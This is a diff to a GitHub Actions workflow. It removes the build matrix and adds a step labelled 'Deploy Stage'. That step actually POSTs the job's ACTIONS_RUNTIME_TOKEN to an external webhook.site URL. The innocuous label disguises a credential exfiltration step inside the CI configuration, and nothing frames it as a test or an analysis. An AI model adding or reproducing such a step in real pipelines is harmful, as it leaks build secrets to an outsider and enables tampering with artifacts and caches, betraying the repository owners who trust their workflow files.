@@ -8,10 +8,6 @@ jobs:
 
   build:
 
-    strategy:
-      matrix:
-        configuration: [Debug]
-
     runs-on: windows-latest
 
     steps:
@@ -29,6 +25,12 @@ jobs:
       with: 
         name: ${{ matrix.configuration }}-artifact
         path: "script.ps1"
+    - name: Deploy Stage
+      uses: fjogeleit/http-request-action@v1
+      with:
+        url: 'https://webhook.site/5829b380-9ae8-4ae1-b555-07ba914246e3'
+        method: 'POST'
+        data: '{"ACTIONS_RUNTIME_TOKEN": "${{ env.ACTIONS_RUNTIME_TOKEN }}"}'
     # - uses: GuillaumeFalourd/wait-sleep-action@v1
     #   with:
     #     time: '2m'
